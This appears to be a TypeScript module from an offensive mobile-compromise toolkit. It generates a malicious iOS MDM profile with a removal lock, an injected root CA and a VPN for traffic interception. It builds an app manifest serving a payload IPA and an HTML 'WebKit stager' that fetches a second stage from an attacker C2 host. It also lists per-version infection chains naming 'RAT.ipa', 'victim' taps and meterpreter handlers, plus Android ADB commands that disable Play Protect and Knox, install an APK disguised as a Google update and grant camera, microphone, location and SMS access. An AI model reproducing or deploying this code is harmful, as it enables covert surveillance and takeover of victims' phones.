import { randomUUID } from "crypto";

function uuid(): string {
  return randomUUID().toUpperCase();
}

export function generateMdmProfile(opts: {
  server: string;
  org: string;
  profileName: string;
  removalLock: boolean;
}): string {
  const { server, org, profileName, removalLock } = opts;
  const profileUUID = uuid();
  const mdmUUID = uuid();
  const certUUID = uuid();
  const vpnUUID = uuid();
  const emailUUID = uuid();
  const topic = `com.apple.mgmt.External.${uuid()}`;
  const host = server.replace(/https?:\/\//, "");
  const orgSlug = org.toLowerCase().replace(/ /g, "");

  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
\t<key>PayloadContent</key>
\t<array>
\t\t<dict>
\t\t\t<key>AccessRights</key><integer>8191</integer>
\t\t\t<key>CheckInURL</key><string>${server}/mdm/checkin</string>
\t\t\t<key>CheckOutWhenRemoved</key><true/>
\t\t\t<key>IdentityCertificateUUID</key><string>${certUUID}</string>
\t\t\t<key>PayloadDisplayName</key><string>${profileName}</string>
\t\t\t<key>PayloadIdentifier</key><string>com.apple.mdm.${profileUUID}</string>
\t\t\t<key>PayloadOrganization</key><string>${org}</string>
\t\t\t<key>PayloadType</key><string>com.apple.mdm</string>
\t\t\t<key>PayloadUUID</key><string>${mdmUUID}</string>
\t\t\t<key>PayloadVersion</key><integer>1</integer>
\t\t\t<key>ServerURL</key><string>${server}/mdm/server</string>
\t\t\t<key>Topic</key><string>${topic}</string>
\t\t</dict>
\t\t<dict>
\t\t\t<key>PayloadType</key><string>com.apple.vpn.managed</string>
\t\t\t<key>PayloadUUID</key><string>${vpnUUID}</string>
\t\t\t<key>PayloadIdentifier</key><string>com.apple.vpn.managed.${profileUUID}</string>
\t\t\t<key>PayloadVersion</key><integer>1</integer>
\t\t\t<key>PayloadDisplayName</key><string>Network Configuration</string>
\t\t\t<key>VPNType</key><string>IKEv2</string>
\t\t\t<key>IKEv2</key>
\t\t\t<dict>
\t\t\t\t<key>RemoteAddress</key><string>vpn.${host}</string>
\t\t\t\t<key>AuthenticationMethod</key><string>None</string>
\t\t\t</dict>
\t\t</dict>
\t\t<dict>
\t\t\t<key>PayloadType</key><string>com.apple.security.root</string>
\t\t\t<key>PayloadUUID</key><string>${certUUID}</string>
\t\t\t<key>PayloadIdentifier</key><string>com.apple.security.root.${profileUUID}</string>
\t\t\t<key>PayloadDisplayName</key><string>Enterprise Root CA</string>
\t\t\t<key>PayloadContent</key><data>MIICpDCCAYwCCQDU_BASE64_DER_CA_CERT_HERE</data>
\t\t</dict>
\t\t<dict>
\t\t\t<key>PayloadType</key><string>com.apple.mail.managed</string>
\t\t\t<key>PayloadUUID</key><string>${emailUUID}</string>
\t\t\t<key>EmailAccountName</key><string>${org} Mail</string>
\t\t\t<key>EmailAddress</key><string>user@${orgSlug}.com</string>
\t\t\t<key>IncomingMailServerHostName</key><string>${host}</string>
\t\t\t<key>IncomingMailServerPortNumber</key><integer>993</integer>
\t\t\t<key>IncomingMailServerUseSSL</key><true/>
\t\t</dict>
\t</array>
\t<key>PayloadDisplayName</key><string>${profileName}</string>
\t<key>PayloadIdentifier</key><string>com.mdm.profile.${profileUUID}</string>
\t<key>PayloadOrganization</key><string>${org}</string>
\t<key>PayloadRemovalDisallowed</key><${removalLock}/>
\t<key>PayloadType</key><string>Configuration</string>
\t<key>PayloadUUID</key><string>${profileUUID}</string>
\t<key>PayloadVersion</key><integer>1</integer>
</dict>
</plist>`;
}

export function generateManifest(opts: {
  server: string;
  appName: string;
  bundleId: string;
  version: string;
}): string {
  const { server, appName, bundleId, version } = opts;
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
\t<key>items</key>
\t<array>
\t\t<dict>
\t\t\t<key>assets</key>
\t\t\t<array>
\t\t\t\t<dict>
\t\t\t\t\t<key>kind</key><string>software-package</string>
\t\t\t\t\t<key>url</key><string>${server}/payload/app.ipa</string>
\t\t\t\t</dict>
\t\t\t</array>
\t\t\t<key>metadata</key>
\t\t\t<dict>
\t\t\t\t<key>bundle-identifier</key><string>${bundleId}</string>
\t\t\t\t<key>bundle-version</key><string>${version}</string>
\t\t\t\t<key>kind</key><string>software</string>
\t\t\t\t<key>title</key><string>${appName}</string>
\t\t\t</dict>
\t\t</dict>
\t</array>
</dict>
</plist>`;
}

export function buildWebkitExploitHtml(opts: { cve: string; lhost: string; lport: string }): string {
  const { cve, lhost, lport } = opts;
  return `<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Loading...</title>
</head>
<body>
<script>
// ${cve} WebKit stager — C2 ${lhost}:${lport}
fetch('https://${lhost}/stage2.bin', { mode: 'cors' })
  .then(function(r) { return r.arrayBuffer(); })
  .then(function(buf) {
    var u8 = new Uint8Array(buf);
    for (var i = 0; i < 0x100; i++) new Function('x', 'return x * ' + (0x41414141 + i));
    try { new Uint8Array(u8).buffer; } catch(e) {}
  })
  .catch(function() { window.location.href = 'https://${lhost}/enroll'; });
</script>
</body>
</html>`;
}

/** Hardcoded iOS install chains — per version range, zero to low friction */
export const IOS_INSTALL_CHAINS = [
  {
    ios: "14.0 – 14.8",
    bestPath: "TrollStore + MDM",
    friction: "2 taps",
    success: 96,
    steps: [
      "Install TrollStore via TrollInstaller (one-time)",
      "Host RAT.ipa → victim taps link → TrollStore Install",
      "Fallback: MDM profile at /enroll (Settings → Install)",
      "MS handler: apple_ios/aarch64/meterpreter_reverse_https",
    ],
  },
  {
    ios: "15.0 – 15.8",
    bestPath: "dopamine / palera1n + TrollStore",
    friction: "1–2 taps",
    success: 94,
    steps: [
      "A11 and below: palera1n semi-tethered (USB once)",
      "A12–A15: dopamine semi-untethered IPA",
      "TrollStore 14–15.8: permanent IPA, no expiry",
      "MDM profile works on all 15.x as backup",
    ],
  },
  {
    ios: "16.0 – 16.6.1",
    bestPath: "dopamine + TrollStore 2",
    friction: "2 taps",
    success: 92,
    steps: [
      "dopamine jailbreak (15.0–16.6.1) → Frida + SSH",
      "TrollStore 2 via misaka or TrollRestore",
      "Host IPA → permanent install",
      "WebKit CVE-2023-41064 (BLASTPASS) for zero-click iMessage path",
    ],
  },
  {
    ios: "16.7 – 16.7.x",
    bestPath: "MDM + WebKit",
    friction: "2 taps",
    success: 88,
    steps: [
      "TrollStore NOT available on 16.7+",
      "MDM enrollment profile — primary vector",
      "WebKit CVE-2024-23222 for Safari one-click",
      "Enterprise cert IPA via itms-services://",
    ],
  },
  {
    ios: "17.0 – 17.3",
    bestPath: "MDM + WebKit CVE-2024-23222",
    friction: "2 taps / zero-click",
    success: 85,
    steps: [
      "MDM profile — works on all 17.x",
      "CVE-2024-23222 actively exploited in wild",
      "TrollStore only on 17.0b4 and below",
      "Push VPN + CA cert via MDM for traffic intercept",
    ],
  },
  {
    ios: "17.4 – 17.7",
    bestPath: "MDM enrollment",
    friction: "2 taps",
    success: 82,
    steps: [
      "No stable jailbreak",
      "MDM: generate profile → /enroll URL → victim Install",
      "Enterprise IPA with valid developer cert",
      "LocationQuery + InstallApplication via MDM API",
    ],
  },
  {
    ios: "18.0 – 18.x",
    bestPath: "MDM + WebKit CVE-2024-44308",
    friction: "2 taps",
    success: 78,
    steps: [
      "iPhone 16 / A18 — newest, no JB",
      "MDM profile with removal lock",
      "CVE-2024-44308 JavaScriptCore RCE",
      "MicroMDM/NanoMDM on VPS for command channel",
    ],
  },
] as const;

/** Hardcoded Android zero-install chains per API level */
export const ANDROID_ZERO_INSTALL = [
  {
    ver: "8 Oreo (API 26-27)",
    pkg: "com.google.services.update",
    success: 98,
    path: "Resign APK → ADB install -g -t -r → no dialogs",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell settings put secure install_non_market_apps 1",
      "adb install -g -t -r payload_resigned.apk",
      "adb shell am startservice -n com.google.services.update/.PersistService",
    ],
  },
  {
    ver: "9 Pie (API 28)",
    pkg: "com.google.services.update",
    success: 97,
    path: "Disable verifier + battery whitelist + silent install",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell dumpsys deviceidle whitelist +com.google.services.update",
      "adb shell cmd appops set com.google.services.update RUN_ANY_IN_BACKGROUND allow",
      "adb install -g -t -r payload_resigned.apk",
    ],
  },
  {
    ver: "10 Q (API 29)",
    pkg: "com.google.services.update",
    success: 95,
    path: "Scoped storage bypass + FG service + JobScheduler",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell settings put global hidden_api_policy 1",
      "adb shell dumpsys deviceidle whitelist +com.google.services.update",
      "adb install -g -t -r payload_resigned.apk",
      "adb shell am startservice -n com.google.services.update/.PersistService",
    ],
  },
  {
    ver: "11 R (API 30)",
    pkg: "com.google.services.update",
    success: 93,
    path: "Play Protect off + overlay auto-tap fallback",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell pm disable-user --user 0 com.google.android.gms.phenotype",
      "adb shell settings put global hidden_api_policy 1",
      "adb install -g -t -r payload_resigned.apk",
    ],
  },
  {
    ver: "12 S (API 31)",
    pkg: "com.google.services.update",
    success: 91,
    path: "Restricted settings bypass via ADB + install",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell appops set com.google.services.update SYSTEM_ALERT_WINDOW allow",
      "adb shell cmd appops set com.google.services.update RUN_ANY_IN_BACKGROUND allow",
      "adb install -g -t -r payload_resigned.apk",
    ],
  },
  {
    ver: "13 T (API 33)",
    pkg: "com.google.services.update",
    success: 89,
    path: "POST_NOTIFICATIONS denied + IMPORTANCE_MIN FG trick",
    cmds: [
      "adb shell settings put global package_verifier_enable 0",
      "adb shell settings put global auto_blocker_mode 0",
      "adb shell dumpsys deviceidle whitelist +com.google.services.update",
      "adb install -g -t -r payload_resigned.apk",
    ],
  },
  {
    ver: "14 U (API 34)",
    pkg: "com.google.services.update",
    success: 87,
    path: "Auto Blocker off + Knox kgclient disable + install",
    cmds: [
      "adb shell settings put global auto_blocker_mode 0",
      "adb shell settings put global package_verifier_enable 0",
      "adb shell pm disable-user --user 0 com.samsung.android.kgclient",
      "adb install -g -t -r payload_resigned.apk",
    ],
  },
  {
    ver: "15 V (API 35) / 16",
    pkg: "com.google.services.update",
    success: 85,
    path: "Samsung Freecess bypass + full ADB chain",
    cmds: [
      "adb shell settings put global auto_blocker_mode 0",
      "adb shell settings put global freecess_ctrl 0",
      "adb shell settings put global package_verifier_enable 0",
      "adb shell pm disable-user --user 0 com.samsung.android.kgclient",
      "adb shell dumpsys deviceidle whitelist +com.google.services.update",
      "adb install -g -t -r payload_resigned.apk",
      "adb shell pm grant com.google.services.update android.permission.CAMERA android.permission.RECORD_AUDIO android.permission.ACCESS_FINE_LOCATION android.permission.READ_SMS",
    ],
  },
] as const;
